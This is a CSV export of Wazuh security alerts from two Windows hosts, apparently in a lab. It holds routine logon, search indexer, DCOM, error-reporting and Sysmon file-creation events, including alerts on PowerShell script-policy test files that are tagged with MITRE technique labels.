wazuh-alerts-4.x-2024.11.30,B_oNfJMBRlc-D5DF4R9H,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,4624, ,0x8020000000000000,{54849625-5478-4994-A5BA-3E3B0328C30D},0,Security,0,"""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-FMI6MML$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x284
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-11-30T07:51:41.625278600Z,227210,708,DESKTOP-FMI6MML,12544,660,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,6,false,3,Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,"[""IV_32.2""]","[""7.1"",""7.2""]",windows_eventchannel,log,"Nov 30, 2024 @ 07:51:42.609",EventChannel,1732953102.1969737,"Nov 30, 2024 @ 07:51:42.609",0x3e7,WORKGROUP,0x0,%%1833,Negotiate,0x3e7,Advapi,{00000000-0000-0000-0000-000000000000},SYSTEM,0,%%1842,S-1-5-18,0x284,C:\\Windows\\System32\\services.exe,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-FMI6MML$,"[""164.312.b""]","[""10.2.5""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AC.7"",""AU.14""]","[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,CfoNfJMBRlc-D5DF5R80,1,1,192.168.117.130,wazuh-agent,002,Maryam,"SearchIndexer, 4944,D,50, Windows:, 1, C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\Windows.edb, 0,  [1] 0.000002 +J(0) [2] 0.026704 +J(0) +M(C:0K, Fs:28, WS:48K # 112K, PF:36K # 0K, P:36K) [3] 0.062512 +J(CM:0, PgRf:0, Rd:0/0, Dy:0/0, Lg:3480/2) +M(C:0K, Fs:38, WS:112K # 80K, PF:144K # 0K, P:144K) [4] 0.000178 +J(0) +M(C:0K, Fs:2, WS:8K # 0K, PF:0K # 0K, P:0K) [5] - [6] - [7] 0.020844 -0.000354 (2) CM +J(CM:2, PgRf:2, Rd:16/2, Dy:0/0, Lg:0/0) +M(C:0K, Fs:59, WS:232K # 208K, PF:664K # 0K, P:664K) [8] 0.040965 -0.040597 (5) CM +J(CM:5, PgRf:23, Rd:0/5, Dy:0/0, Lg:0/0) +M(C:0K, Fs:69, WS:276K # 276K, PF:256K # 144K, P:256K) [9] 0.000553 -0.000435 (1) CM +J(CM:1, PgRf:40, Rd:0/1, Dy:0/0, Lg:0/0) +M(C:0K, Fs:14, WS:56K # 56K, PF:96K # 96K, P:96K) [10] 0.000009 +J(CM:0, PgRf:1, Rd:0/0, Dy:0/0, Lg:0/0) +M(C:0K, Fs:1, WS:4K # 4K, PF:0K # 0K, P:0K) [11] 0.000037 +J(CM:0, PgRf:42, Rd:0/0, Dy:0/0, Lg:0/0) +M(C:0K, Fs:4, WS:16K # 16K, PF:0K # 0K, P:0K) [12] 0.0 +J(0) [13] 0.0 +J(0) [14] 0.000004 +J(CM:0, PgRf:1, Rd:0/0, Dy:0/0, Lg:0/0)., 0 0, lgposAttach = 00000008:0001:0268",326, ,0x80000000000000, ,4,Application, ,"""SearchIndexer (4944,D,50) Windows: The database engine attached a database (1, C:\ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb). (Time=0 seconds) 
 
Saved Cache: 0 0 
Additional Data: lgposAttach = 00000008:0001:0268 
 
Internal Timing Sequence: 
[1] 0.000002 +J(0)
[2] 0.026704 +J(0) +M(C:0K, Fs:28, WS:48K # 112K, PF:36K # 0K, P:36K)
[3] 0.062512 +J(CM:0, PgRf:0, Rd:0/0, Dy:0/0, Lg:3480/2) +M(C:0K, Fs:38, WS:112K # 80K, PF:144K # 0K, P:144K)
[4] 0.000178 +J(0) +M(C:0K, Fs:2, WS:8K # 0K, PF:0K # 0K, P:0K)
[5] -
[6] -
[7] 0.020844 -0.000354 (2) CM +J(CM:2, PgRf:2, Rd:16/2, Dy:0/0, Lg:0/0) +M(C:0K, Fs:59, WS:232K # 208K, PF:664K # 0K, P:664K)
[8] 0.040965 -0.040597 (5) CM +J(CM:5, PgRf:23, Rd:0/5, Dy:0/0, Lg:0/0) +M(C:0K, Fs:69, WS:276K # 276K, PF:256K # 144K, P:256K)
[9] 0.000553 -0.000435 (1) CM +J(CM:1, PgRf:40, Rd:0/1, Dy:0/0, Lg:0/0) +M(C:0K, Fs:14, WS:56K # 56K, PF:96K # 96K, P:96K)
[10] 0.000009 +J(CM:0, PgRf:1, Rd:0/0, Dy:0/0, Lg:0/0) +M(C:0K, Fs:1, WS:4K # 4K, PF:0K # 0K, P:0K)
[11] 0.000037 +J(CM:0, PgRf:42, Rd:0/0, Dy:0/0, Lg:0/0) +M(C:0K, Fs:4, WS:16K # 16K, PF:0K # 0K, P:0K)
[12] 0.0 +J(0)
[13] 0.0 +J(0)
[14] 0.000004 +J(CM:0, PgRf:1, Rd:0/0, Dy:0/0, Lg:0/0).""", ,2024-11-30T07:51:43.218108800Z,1662, ,DESKTOP-FMI6MML,1, ,INFORMATION,ESENT,1,false,3,The database engine attached a database.,"[""windows"",""windows_application""]",60798, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:51:43.626",EventChannel,1732953103.1978250,"Nov 30, 2024 @ 07:51:43.626", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,CvoNfJMBRlc-D5DF5R80,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,10016,DCOM,0x8080000000000000,{1B562E86-B7AA-4131-BADC-B6F3A001407E},2,System,0,"""The application-specific permission settings do not grant Local Launch permission for the COM Server application with CLSID 
Windows.SecurityCenter.WscDataProtection
 and APPID 
Unavailable
 to the user NT AUTHORITY\SYSTEM SID (S-1-5-18) from address LocalHost (Using LRPC) running in the application container Unavailable SID (Unavailable). This security permission can be modified using the Component Services administrative tool.""",0,2024-11-30T07:51:42.593101800Z,1769,1628,DESKTOP-FMI6MML,0,936,ERROR,Microsoft-Windows-DistributedCOM,1,false,5,Windows System error event,"[""windows"",""windows_system"",""system_error""]",61102,"[""IV_35.7.d""]","[""4.3""]",windows_eventchannel,log,"Nov 30, 2024 @ 07:51:44.001",EventChannel,1732953104.1983779,"Nov 30, 2024 @ 07:51:44.001", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,application-specific,Local, , ,Launch,Windows.SecurityCenter.WscDataProtection, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,SYSTEM,S-1-5-18,Unavailable,NT AUTHORITY,LocalHost (Using LRPC),Unavailable,Unavailable, , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,DPoNfJMBRlc-D5DF5R80,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,1003,Windows Search Service,0x80000000000000,{CA4E628D-8567-4896-AB6B-835B221F373F},4,Application,0,"""The Windows Search Service started.
""",0,2024-11-30T07:51:43.655395600Z,1663,0,DESKTOP-FMI6MML,1,0,INFORMATION,Microsoft-Windows-Search,1,false,3,The Windows search service started.,"[""windows"",""windows_application""]",60668, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:51:44.126",EventChannel,1732953104.1993897,"Nov 30, 2024 @ 07:51:44.126", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,IvoTfJMBRlc-D5DFTB8a,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,4624, ,0x8020000000000000,{54849625-5478-4994-A5BA-3E3B0328C30D},0,Security,0,"""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-FMI6MML$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x284
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-11-30T07:57:36.416301700Z,227781,712,DESKTOP-FMI6MML,12544,660,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,12,false,3,Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,"[""IV_32.2""]","[""7.1"",""7.2""]",windows_eventchannel,log,"Nov 30, 2024 @ 07:57:37.639",EventChannel,1732953457.2066672,"Nov 30, 2024 @ 07:57:37.639",0x3e7,WORKGROUP,0x0,%%1833,Negotiate,0x3e7,Advapi,{00000000-0000-0000-0000-000000000000},SYSTEM,0,%%1842,S-1-5-18,0x284,C:\\Windows\\System32\\services.exe,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-FMI6MML$,"[""164.312.b""]","[""10.2.5""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AC.7"",""AU.14""]","[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,I_oTfJMBRlc-D5DFTB8a,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,4624, ,0x8020000000000000,{54849625-5478-4994-A5BA-3E3B0328C30D},0,Security,0,"""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-FMI6MML$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x284
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-11-30T07:57:36.478089100Z,227787,712,DESKTOP-FMI6MML,12544,660,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,13,false,3,Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,"[""IV_32.2""]","[""7.1"",""7.2""]",windows_eventchannel,log,"Nov 30, 2024 @ 07:57:37.718",EventChannel,1732953457.2073996,"Nov 30, 2024 @ 07:57:37.718",0x3e7,WORKGROUP,0x0,%%1833,Negotiate,0x3e7,Advapi,{00000000-0000-0000-0000-000000000000},SYSTEM,0,%%1842,S-1-5-18,0x284,C:\\Windows\\System32\\services.exe,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-FMI6MML$,"[""164.312.b""]","[""10.2.5""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AC.7"",""AU.14""]","[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,JvoTfJMBRlc-D5DFTx__,1,1,192.168.117.130,wazuh-agent,002,Maryam,"1780792586092680223, 5, StoreAgentScanForUpdatesFailure0, Not available, 0, Update;, 800704cf, 17134, 165, Windows.Desktop,   \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER89A0.tmp.WERInternalMetadata.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER89B1.tmp.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER89DE.tmp.csv  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER89EF.tmp.txt, C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\NonCritical_Update;_472d9f7221abece177a292950a88db68b87bb78_00000000_13179057, 0, 365a15c1-b61a-4d29-b9af-0885ebec4f07, 268435456, 80dc35a8be4150b778b6a56c08b4141f, 0",1001, ,0x80000000000000, ,4,Application, ,"""Fault bucket 1780792586092680223, type 5
Event Name: StoreAgentScanForUpdatesFailure0
Response: Not available
Cab Id: 0

Problem signature:
P1: Update;
P2: 800704cf
P3: 17134
P4: 165
P5: Windows.Desktop
P6: 
P7: 
P8: 
P9: 
P10: 

Attached files:
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER89A0.tmp.WERInternalMetadata.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER89B1.tmp.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER89DE.tmp.csv
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER89EF.tmp.txt

These files may be available here:
C:\ProgramData\Microsoft\Windows\WER\ReportArchive\NonCritical_Update;_472d9f7221abece177a292950a88db68b87bb78_00000000_13179057

Analysis symbol: 
Rechecking for solution: 0
Report Id: 365a15c1-b61a-4d29-b9af-0885ebec4f07
Report Status: 268435456
Hashed bucket: 80dc35a8be4150b778b6a56c08b4141f
Cab Guid: 0""", ,2024-11-30T07:57:38.827590000Z,1677, ,DESKTOP-FMI6MML,0, ,INFORMATION,Windows Error Reporting,5,false,4,Summary event of the report's signatures.,"[""windows"",""windows_application""]",60608, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:57:39.237",EventChannel,1732953459.2092583,"Nov 30, 2024 @ 07:57:39.237", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,D_oOfJMBRlc-D5DFRh_Y,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,4624, ,0x8020000000000000,{54849625-5478-4994-A5BA-3E3B0328C30D},0,Security,0,"""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-FMI6MML$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x284
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-11-30T07:52:02.965948500Z,227263,700,DESKTOP-FMI6MML,12544,660,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,9,false,3,Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,"[""IV_32.2""]","[""7.1"",""7.2""]",windows_eventchannel,log,"Nov 30, 2024 @ 07:52:04.170",EventChannel,1732953124.2005570,"Nov 30, 2024 @ 07:52:04.170",0x3e7,WORKGROUP,0x0,%%1833,Negotiate,0x3e7,Advapi,{00000000-0000-0000-0000-000000000000},SYSTEM,0,%%1842,S-1-5-18,0x284,C:\\Windows\\System32\\services.exe,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-FMI6MML$,"[""164.312.b""]","[""10.2.5""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AC.7"",""AU.14""]","[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,BPoNfJMBRlc-D5DFRR8D,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 07:51:00.879
ProcessGuid: {15959494-C3E4-674A-A406-000000000D00}
ProcessId: 7460
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_t35lnxba.31a.ps1
CreationUtcTime: 2024-11-30 07:51:00.879
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T07:51:00.893313200Z,55823,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,13,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:51:02.018",EventChannel,1732953062.1961850,"Nov 30, 2024 @ 07:51:02.018", , , , , , , , , , , , ,7460, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C3E4-674A-A406-000000000D00},2024-11-30 07:51:00.879, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_t35lnxba.31a.ps1,2024-11-30 07:51:00.879, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,IPoSfJMBRlc-D5DF6h9t,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 07:57:11.757
ProcessGuid: {15959494-C557-674A-AC06-000000000D00}
ProcessId: 4176
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_4zwpprnp.coq.ps1
CreationUtcTime: 2024-11-30 07:57:11.757
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T07:57:11.766843600Z,55937,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,20,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:57:12.876",EventChannel,1732953432.2056337,"Nov 30, 2024 @ 07:57:12.876", , , , , , , , , , , , ,4176, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C557-674A-AC06-000000000D00},2024-11-30 07:57:11.757, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_4zwpprnp.coq.ps1,2024-11-30 07:57:11.757, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,E_oPfJMBRlc-D5DFJR-F,1,1,192.168.117.130,wazuh-agent,002,Maryam,"0, WindowsUpdateFailure3, Not available, 0, 10.0.17134.137, 800704cf, 00000000-0000-0000-0000-000000000000, Scan, 0, 0, 0, Windows Defender Antivirus (77BDAF73-B396-481F-9042-AD358843EC24), {8B24B027-1DEE-BABB-9A95-3517DFB9C552}, 0, 0, 6028d973-8dfb-4c64-9279-e84a333d410d, 1074003968, 0",1001, ,0x80000000000000, ,4,Application, ,"""Fault bucket , type 0
Event Name: WindowsUpdateFailure3
Response: Not available
Cab Id: 0

Problem signature:
P1: 10.0.17134.137
P2: 800704cf
P3: 00000000-0000-0000-0000-000000000000
P4: Scan
P5: 0
P6: 0
P7: 0
P8: Windows Defender Antivirus (77BDAF73-B396-481F-9042-AD358843EC24)
P9: {8B24B027-1DEE-BABB-9A95-3517DFB9C552}
P10: 0

Attached files:

These files may be available here:


Analysis symbol: 
Rechecking for solution: 0
Report Id: 6028d973-8dfb-4c64-9279-e84a333d410d
Report Status: 1074003968
Hashed bucket: 
Cab Guid: 0""", ,2024-11-30T07:52:59.858466000Z,1669, ,DESKTOP-FMI6MML,0, ,INFORMATION,Windows Error Reporting,1,false,4,Summary event of the report's signatures.,"[""windows"",""windows_application""]",60608, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:53:00.307",EventChannel,1732953180.2019151,"Nov 30, 2024 @ 07:53:00.307", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,F_oPfJMBRlc-D5DFJR-F,1,1,192.168.117.130,wazuh-agent,002,Maryam,"0, WindowsUpdateFailure3, Not available, 0, 10.0.17134.137, 800704cf, 00000000-0000-0000-0000-000000000000, Scan, 0, 0, 0, Windows Defender Antivirus (77BDAF73-B396-481F-9042-AD358843EC24), {8B24B027-1DEE-BABB-9A95-3517DFB9C552}, 0,   \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER4EBD.tmp.WERInternalMetadata.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER4EDD.tmp.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER4EFC.tmp.csv  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER4F0C.tmp.txt, C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\NonCritical_10.0.17134.137_961cfd7caf5fc9c3a5c585d884b229546f83ded_00000000_058f565e, 0, 6028d973-8dfb-4c64-9279-e84a333d410d, 2147491840, 0",1001, ,0x80000000000000, ,4,Application, ,"""Fault bucket , type 0
Event Name: WindowsUpdateFailure3
Response: Not available
Cab Id: 0

Problem signature:
P1: 10.0.17134.137
P2: 800704cf
P3: 00000000-0000-0000-0000-000000000000
P4: Scan
P5: 0
P6: 0
P7: 0
P8: Windows Defender Antivirus (77BDAF73-B396-481F-9042-AD358843EC24)
P9: {8B24B027-1DEE-BABB-9A95-3517DFB9C552}
P10: 0

Attached files:
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER4EBD.tmp.WERInternalMetadata.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER4EDD.tmp.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER4EFC.tmp.csv
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER4F0C.tmp.txt

These files may be available here:
C:\ProgramData\Microsoft\Windows\WER\ReportArchive\NonCritical_10.0.17134.137_961cfd7caf5fc9c3a5c585d884b229546f83ded_00000000_058f565e

Analysis symbol: 
Rechecking for solution: 0
Report Id: 6028d973-8dfb-4c64-9279-e84a333d410d
Report Status: 2147491840
Hashed bucket: 
Cab Guid: 0""", ,2024-11-30T07:53:01.843323700Z,1671, ,DESKTOP-FMI6MML,0, ,INFORMATION,Windows Error Reporting,3,false,4,Summary event of the report's signatures.,"[""windows"",""windows_application""]",60608, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:53:02.251",EventChannel,1732953182.2036221,"Nov 30, 2024 @ 07:53:02.251", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
